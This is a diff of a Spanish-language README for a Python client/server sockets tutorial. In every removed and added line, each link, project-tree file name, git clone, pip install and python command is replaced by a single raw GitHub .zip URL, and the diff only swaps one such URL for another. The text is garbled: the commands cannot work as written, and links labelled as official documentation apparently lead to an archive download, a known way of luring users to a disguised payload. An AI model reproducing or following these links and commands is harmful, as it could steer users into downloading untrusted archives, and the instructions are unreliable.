@@ -2,37 +2,37 @@
 
 ## Descripción
 
-Este proyecto proporciona una plantilla para la implementación de los ejemplos del modelo Cliente/Servidor, según se explican en el vídeo [Programando Cliente/Servidor con Python](https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip)
+Este proyecto proporciona una plantilla para la implementación de los ejemplos del modelo Cliente/Servidor, según se explican en el vídeo [Programando Cliente/Servidor con Python](https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip)
 
 ## Estructura del Proyecto
 
 ```
 as-taller1/
-├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
-├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
+├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ├── .gitignore
 ├── 01_sockets/
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
-│   └── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+│   ├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
+│   └── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ├── 02_echo/
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
-│   └── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+│   ├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
+│   └── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ├── 03_chat/
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
-│   └── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+│   ├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
+│   └── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ├── 04_http/
-│   ├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
-│   └── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+│   ├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
+│   └── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 └── 05_proyecto/
-    ├── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
-    └── https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+    ├── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
+    └── https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ```
 
 ## Instalación
 
 ```bash
 # Clonar el repositorio
-git clone https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+git clone https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 cd as-taller1
 
 # Crear entorno virtual
@@ -44,7 +44,7 @@ venv\Scripts\activate
 source venv/bin/activate
 
 # Instalar dependencias
-pip install -r https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+pip install -r https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ```
 
 ## Ejercicios
@@ -62,10 +62,10 @@ pip install -r https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latini
 
 ```bash
 # Terminal 1 - Servidor
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 
 # Terminal 2 - Cliente
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ```
 
 ### 2. Servidor Echo
@@ -81,10 +81,10 @@ python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/a
 
 ```bash
 # Terminal 1 - Servidor
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 
 # Terminal 2 - Cliente
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ```
 
 ### 3. Chat Multiusuario
@@ -100,10 +100,10 @@ python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/a
 
 ```bash
 # Terminal 1 - Servidor
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 
 # Terminales adicionales - Clientes
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ```
 
 ### 4. Servidor HTTP Básico
@@ -119,7 +119,7 @@ python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/a
 
 ```bash
 # Servidor HTTP
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 
 # Acceder desde navegador:
 # http://localhost:8080
@@ -138,10 +138,10 @@ python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/a
 
 ```bash
 # Terminal 1 - Servidor
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 
 # Terminal 2 - Cliente
-python https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip
+python https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip
 ```
 
 ## Conceptos
@@ -249,10 +249,10 @@ Son un número de 16 bits que identifica una aplicación o servicio específico 
 
 ## Recursos Adicionales
 
-- [Documentación oficial de sockets en Python](https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip)
-- [Python Socket Programming: Server and Client Example Guide](https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip)
-- [Socket Programming in Python (Guide)](https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip)
-- [Python Socket Programming: Server-Client Connection](https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip)
-- [Guía completa de programación de sockets en Python](https://raw.githubusercontent.com/axlcraft/as-taller1/main/Latinistical/as-taller1.zip)
+- [Documentación oficial de sockets en Python](https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip)
+- [Python Socket Programming: Server and Client Example Guide](https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip)
+- [Socket Programming in Python (Guide)](https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip)
+- [Python Socket Programming: Server-Client Connection](https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip)
+- [Guía completa de programación de sockets en Python](https://github.com/axlcraft/as-taller1/raw/refs/heads/main/02_echo/as_taller_2.0-beta.4.zip)
 
 
